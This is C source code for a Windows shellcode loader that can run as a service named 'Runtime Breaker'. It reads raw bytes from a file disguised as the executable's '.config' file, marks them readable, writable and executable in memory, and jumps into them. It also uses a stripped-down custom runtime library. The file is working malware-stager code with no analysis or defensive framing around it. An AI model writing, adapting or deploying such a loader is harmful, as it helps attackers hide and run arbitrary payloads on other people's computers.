#include "../crt.c"
#include <windows.h>

#define SERVICE_NAME "Runtime Breaker"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void start()
{
    HANDLE hFile;
    LPVOID lpAddress;
    DWORD dwSize = 0;
    DWORD temp = 0;
    char szPath[MAX_PATH];
    DWORD dwRet;
    char *p;

    xmemset(szPath,0,MAX_PATH);

    xstrcat(szPath,_argv[0]);
    xstrcat(szPath,".config");

    hFile = CreateFileA(szPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    dwSize = GetFileSize(hFile, NULL);
    lpAddress = xmalloc(dwSize);
    if (lpAddress == NULL)
    {
        CloseHandle(hFile);
        return;
    }
    ReadFile(hFile, lpAddress, dwSize, &temp, 0);
    VirtualProtect(lpAddress, dwSize, 0x40, &temp);
    ((void(*)())lpAddress)();   
}

void ControlHandler(DWORD request) {
    switch(request) {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus (hStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    return;
}

void ServiceMain(int argc, char* argv[]) {
    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint         = 0;
    ServiceStatus.dwWaitHint           = 0;

    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);

    if (hStatus == (SERVICE_STATUS_HANDLE)NULL)
        return;

    start();
    //ExitProcess(0);
}

int main()
{
    int _argc = _init_args();
    if (_argc == 2 && xstrcmp(_argv[1],"-service")==0) {
        SERVICE_TABLE_ENTRY ServiceTable[2] = { { NULL, NULL }, { NULL, NULL } };
        ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
        ServiceTable[0].lpServiceName = SERVICE_NAME;
        StartServiceCtrlDispatcher(ServiceTable);
        return -1;
    }
    else
    {
        start();
    }
    _term_args();
    TerminateProcess(GetCurrentProcess(),0);
    return 0;
}